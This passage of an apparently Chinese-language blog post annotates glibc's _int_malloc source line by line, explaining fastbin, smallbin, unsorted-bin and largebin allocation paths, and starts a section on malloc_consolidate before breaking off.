(victim)));<br>  <span class="hljs-comment">//返回申请到的内存</span><br>  <span class="hljs-keyword">return</span> victim;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a><code>_int_malloc</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br>_int_malloc (mstate av, <span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  INTERNAL_SIZE_T nb;               <span class="hljs-comment">/* 请求的chunk_size */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx;                 <span class="hljs-comment">/* 对应bin数组中的index */</span><br>  mbinptr bin;                      <span class="hljs-comment">/* 指向对应bin的指针 */</span><br><br>  mchunkptr victim;                 <span class="hljs-comment">/* 指向分配的chunk */</span><br>  INTERNAL_SIZE_T size;             <span class="hljs-comment">/* 分配的chunk的size */</span><br>  <span class="hljs-type">int</span> victim_index;                 <span class="hljs-comment">/* 分配的chunk的bin的index */</span><br><br>  mchunkptr remainder;              <span class="hljs-comment">/* 指向分割后剩下的那块chunk */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> remainder_size;     <span class="hljs-comment">/* 分割后剩下的那块chunk的size */</span><br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block;               <span class="hljs-comment">/* bit map traverse */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bit;                 <span class="hljs-comment">/* bit map traverser */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-built_in">map</span>;                 <span class="hljs-comment">/* 一个block值 */</span><br><br>  mchunkptr fwd;                    <span class="hljs-comment">/* 用于链表操作 */</span><br>  mchunkptr bck;                    <span class="hljs-comment">/* 用于链表操作 */</span><br><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errstr = <span class="hljs-literal">NULL</span>;        <span class="hljs-comment">//报错字符串指针</span><br><br>  checked_request2size (bytes, nb); <span class="hljs-comment">//将申请内存的字节数转换为合适的chunk size存入nb</span><br><br><span class="hljs-comment">//检查是否有可用的arena</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (av == <span class="hljs-literal">NULL</span>))<br>    &#123;<br>  <span class="hljs-comment">//无可用的arena，使用sysmalloc获取内存</span><br>      <span class="hljs-type">void</span> *p = sysmalloc (nb, av);<br>      <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>      <span class="hljs-comment">//内存分配成功则对内存进行扰动处理，即填充内存特定字节</span><br>alloc_perturb (p, bytes);<br>      <span class="hljs-keyword">return</span> p;<br>    &#125;<br><br> <span class="hljs-comment">//要分配的chunk size小于等于global_max_fast则先从fastbin中寻找</span><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (get_max_fast ()))<span class="hljs-comment">//get_max_fast用于获取global_max_fast</span><br>    &#123;<br>  <span class="hljs-comment">//通过size计算其在fastbin中对应的索引然后存入idx</span><br>      idx = fastbin_index (nb);<br>      <span class="hljs-comment">//通过idx获取arena的fastbin中对应的bin</span><br>      mfastbinptr *fb = &amp;fastbin (av, idx);<br>      <span class="hljs-comment">//获取bin的首个chunk</span><br>      mchunkptr pp = *fb;<br><br><span class="hljs-comment">//这段代码在并发环境下，通过循环和原子操作安全地从自由链表中取出一个空闲块。它使用 catomic_compare_and_exchange_val_acq 来确保无锁访问的原子性，使得多个线程能够同时操作同一个自由链表而不会出现数据竞争。</span><br>      <span class="hljs-keyword">do</span><br>        &#123;<span class="hljs-comment">//将当前链表的头节点赋值给victim</span><br>          victim = pp;<br>          <span class="hljs-comment">//如果链表为空跳出循环</span><br>          <span class="hljs-keyword">if</span> (victim == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">//使用CAS操作确保线程安全，如果fastbin的头指针未被其它线程修改，将下一个块的地址设置为链表新的头节点</span><br>      <span class="hljs-keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))<br>             != victim);<br><br><br>      <span class="hljs-comment">//此时victim是该fb原来的首个chunk，或者为0</span><br>      <span class="hljs-keyword">if</span> (victim != <span class="hljs-number">0</span>)<br>        &#123;<br>          <span class="hljs-comment">//如果victim的大小不符合当前fastbin的要求，则进行错误处理</span><br>          <span class="hljs-keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="hljs-number">0</span>))<br>            &#123;<br>            <span class="hljs-comment">//错误处理</span><br>              errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>            errout:<br>              malloc_printerr (check_action, errstr, chunk2mem (victim), av);<br>              <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>            &#125;<br>          <span class="hljs-comment">//检查victim块是否被重复分配或被修改，确保内存安全性。</span><br>          check_remalloced_chunk (av, victim, nb);<br>          <span class="hljs-comment">//将chunk块指针转换为user data的指针。</span><br><span class="hljs-comment">//#define chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span><br>          <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>          <span class="hljs-comment">//用于初始化内存块p，将其中的数据用固定字节填充。</span><br>          alloc_perturb (p, bytes);<br>          <span class="hljs-comment">//将分配出来的内存指针返回</span><br>          <span class="hljs-keyword">return</span> p;<br>        &#125;<br>    &#125;<br><br><span class="hljs-comment">//如果前面在fastbin中没有找到就会从smallbin中查找</span><br><span class="hljs-comment">//如果size小于largebin中最小的size那么就从smallbin中查找</span><br><span class="hljs-comment">/*#define in_smallbin_range(sz)  \</span><br><span class="hljs-comment">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)*/</span><br><br><span class="hljs-comment">//#define MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span><br><span class="hljs-comment">//#define NSMALLBINS         64  </span><br><span class="hljs-comment">//#define SMALLBIN_WIDTH    MALLOC_ALIGNMENT  </span><br><span class="hljs-comment">//#define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span><br><span class="hljs-comment">//MALLOC_ALIGNMENT (2 *SIZE_SZ)，32位为8字节，64位为16字节</span><br><span class="hljs-comment">//min_large_size为0x400</span><br><br>  <span class="hljs-comment">//该宏返回一个布尔值，如果sz小于min_large_size，则返回true</span><br>  <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>    &#123;<br>    <br><span class="hljs-comment">/*smallbin_index(sz)</span><br><span class="hljs-comment">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))</span><br><span class="hljs-comment">  + SMALLBIN_CORRECTION)*/</span><br><br>  <span class="hljs-comment">//根据size找到相应在smallbin中的下标</span><br>      idx = smallbin_index (nb);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">bin_at(m, i)</span><br><span class="hljs-comment">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))</span><br><span class="hljs-comment">  - offsetof (struct malloc_chunk, fd))</span><br><span class="hljs-comment"> */</span><br> <span class="hljs-comment">//m-&gt;bins，获取bins数组</span><br> <span class="hljs-comment">//((i)-1)*2，索引i表示bin的编号</span><br> <span class="hljs-comment">//&amp;((m)-&gt;bins[((i)-1)*2]，计算出目标bin在bins数组中的地址</span><br><span class="hljs-comment">//#define offsetof(TYPE, MEMBER) __builtin_offsetof (TYPE, MEMBER)</span><br><span class="hljs-comment">//offsetof宏计算fd成员在malloc_chunk中的偏移量</span><br><span class="hljs-comment">//从bins的地址减去fd的偏移量，得到一个完整的chunk结构的基地址</span><br><br>      <span class="hljs-comment">//根据下标将这个bin取出来</span><br>      bin = bin_at (av, idx);<br><br><span class="hljs-comment">//last(b) ((b)-&gt;bk</span><br>  <span class="hljs-comment">//last获取当前bk指向的值，如果不等于bin则smallbin不为空</span><br>  <span class="hljs-comment">//一般向bin中取出块用bk，添加块用fd</span><br>      <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin)<br>        &#123;<br>          <br>          <span class="hljs-keyword">if</span> (victim == <span class="hljs-number">0</span>) <br>          <br>            <span class="hljs-comment">//victim为0，表示smallbin还没有初始化为双向循环链表，调用malloc_consolidate函数，此时由于global_max_fast也未初始化，所以会调用malloc_init_state初始化</span><br>            malloc_consolidate (av);<br>          <span class="hljs-keyword">else</span><br>            &#123;<br>              bck = victim-&gt;bk;<br>    <span class="hljs-comment">//双向链表检测，last(bin)-&gt;bk-&gt;fd == last(bin)</span><br>    <span class="hljs-comment">//检查下一个chunk的bk指向的上一个chunk是否指向bin</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>                &#123;<br>                  <br>                  errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>                  <span class="hljs-keyword">goto</span> errout;<br>                &#125;<br>          <span class="hljs-comment">//设置inuse标志</span><br>              set_inuse_bit_at_offset (victim, nb);<br>              <span class="hljs-comment">//将victim从smallbin的双向循环链表中取出</span><br>              bin-&gt;bk = bck;<br>              bck-&gt;fd = bin;<br><br>  <span class="hljs-comment">//判断是否指向main_arena</span><br>              <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>            <span class="hljs-comment">//如果不指向，则将non_main_arena置为1</span><br>                victim-&gt;size |= NON_MAIN_ARENA;<br>          <span class="hljs-comment">//检查victim所指向的已分配内存块的完整性和合法性，确保分配的内存块符合预期的大小和对齐要求</span><br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-comment">//将指向chunk头部的指针指向user data</span><br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              <span class="hljs-comment">//用于将分配的内存区域填充特定模式的数据，以便在调试和诊断中帮助检测未初始化内存使用等问题</span><br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>      <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-comment">//如果smallbin没有就从largebin取</span><br>      idx = largebin_index (nb);<br>      <span class="hljs-comment">//先查看是否存在fastbin</span><br>      <span class="hljs-keyword">if</span> (have_fastchunks (av))<br>        malloc_consolidate (av);<br>    &#125;<br><br><br>  <span class="hljs-keyword">for</span> (;; )<br>    &#123;<br>      <span class="hljs-type">int</span> iters = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>        &#123;<br>          bck = victim-&gt;bk;<br>          <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>            malloc_printerr (check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>,<br>                             chunk2mem (victim), av);<br>          size = chunksize (victim);<br>          <br><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>              bck == unsorted_chunks (av) &amp;&amp;<br>              victim == av-&gt;last_remainder &amp;&amp;<br>              (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>            &#123;<br>              <span class="hljs-comment">/* split and reattach remainder */</span><br>              remainder_size = size - nb;<br>              remainder = chunk_at_offset (victim, nb);<br>              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>              av-&gt;last_remainder = remainder;<br>              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>              <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                &#123;<br>                  remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                  remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                &#125;<br><br>              set_head (victim, nb | PREV_INUSE |<br>                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>              set_head (remainder, remainder_size | PREV_INUSE);<br>              set_foot (remainder, remainder_size);<br><br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br><br>          <span class="hljs-comment">/* remove from unsorted list */</span><br>          unsorted_chunks (av)-&gt;bk = bck;<br>          bck-&gt;fd = unsorted_chunks (av);<br><br>          <span class="hljs-comment">/* Take now instead of binning if exact fit */</span><br><br>          <span class="hljs-keyword">if</span> (size == nb)<br>            &#123;<br>              set_inuse_bit_at_offset (victim, size);<br>              <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                victim-&gt;size |= NON_MAIN_ARENA;<br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br><br>          <span class="hljs-comment">/* place chunk in bin */</span><br><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>            &#123;<br>              victim_index = smallbin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br>            &#125;<br>          <span class="hljs-keyword">else</span><br>            &#123;<br>              victim_index = largebin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br><br>              <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>              <span class="hljs-keyword">if</span> (fwd != bck)<br>                &#123;<br>                  <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                  size |= PREV_INUSE;<br>                  <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<br>                    &#123;<br>                      fwd = bck;<br>                      bck = bck-&gt;bk;<br><br>                      victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                    &#125;<br>                  <span class="hljs-keyword">else</span><br>                    &#123;<br>                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                      <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                        &#123;<br>                          fwd = fwd-&gt;fd_nextsize;<br>                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                        &#125;<br><br>                      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                        fwd = fwd-&gt;fd;<br>                      <span class="hljs-keyword">else</span><br>                        &#123;<br>                          victim-&gt;fd_nextsize = fwd;<br>                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                          fwd-&gt;bk_nextsize = victim;<br>                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        &#125;<br>                      bck = fwd-&gt;bk;<br>                    &#125;<br>                &#125;<br>              <span class="hljs-keyword">else</span><br>                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>            &#125;<br><br>          mark_bin (av, victim_index);<br>          victim-&gt;bk = bck;<br>          victim-&gt;fd = fwd;<br>          fwd-&gt;bk = victim;<br>          bck-&gt;fd = victim;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ITERS       10000</span><br>          <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">         If a large request, scan through the chunks of current bin in</span><br><span class="hljs-comment">         sorted order to find smallest that fits.  Use the skip list for this.</span><br><span class="hljs-comment">       */</span><br><br>      <span class="hljs-keyword">if</span> (!in_smallbin_range (nb))<br>        &#123;<br>          bin = bin_at (av, idx);<br><br>          <span class="hljs-comment">/* skip scan if empty or largest chunk is too small */</span><br>          <span class="hljs-keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;<br>              (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (victim-&gt;size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb))<br>            &#123;<br>              victim = victim-&gt;bk_nextsize;<br>              <span class="hljs-keyword">while</span> (((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size = chunksize (victim)) &lt;<br>                      (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb)))<br>                victim = victim-&gt;bk_nextsize;<br><br>              <span class="hljs-comment">/* Avoid removing the first entry for a size so that the skip</span><br><span class="hljs-comment">                 list does not have to be rerouted.  */</span><br>              <span class="hljs-keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)<br>                victim = victim-&gt;fd;<br><br>              remainder_size = size - nb;<br>              unlink (av, victim, bck, fwd);<br><br>              <span class="hljs-comment">/* Exhaust */</span><br>              <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>                &#123;<br>                  set_inuse_bit_at_offset (victim, size);<br>                  <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                    victim-&gt;size |= NON_MAIN_ARENA;<br>                &#125;<br>              <span class="hljs-comment">/* Split */</span><br>              <span class="hljs-keyword">else</span><br>                &#123;<br>                  remainder = chunk_at_offset (victim, nb);<br>                  <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                     have to perform a complete insert here.  */</span><br>                  bck = unsorted_chunks (av);<br>                  fwd = bck-&gt;fd;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>                    &#123;<br>                      errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;<br>                      <span class="hljs-keyword">goto</span> errout;<br>                    &#125;<br>                  remainder-&gt;bk = bck;<br>                  remainder-&gt;fd = fwd;<br>                  bck-&gt;fd = remainder;<br>                  fwd-&gt;bk = remainder;<br>                  <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                    &#123;<br>                      remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                      remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                    &#125;<br>                  set_head (victim, nb | PREV_INUSE |<br>                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>                  set_head (remainder, remainder_size | PREV_INUSE);<br>                  set_foot (remainder, remainder_size);<br>                &#125;<br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><h3 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a><code>malloc_consolidate</code></h3><ol><li>首先判断当前 malloc_state 结构体中的 fastbin 是否为空，如果为空就说明整个 malloc_state 都没有完成初始化，需要对malloc_state 进行初始化。</li><li>malloc_state 的初始化操作由函数 malloc_init_state(av) 完成，该函数先初始化除 fastbins 之外的所有的bins，再初始化 fastbins，清空 fastbins</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span 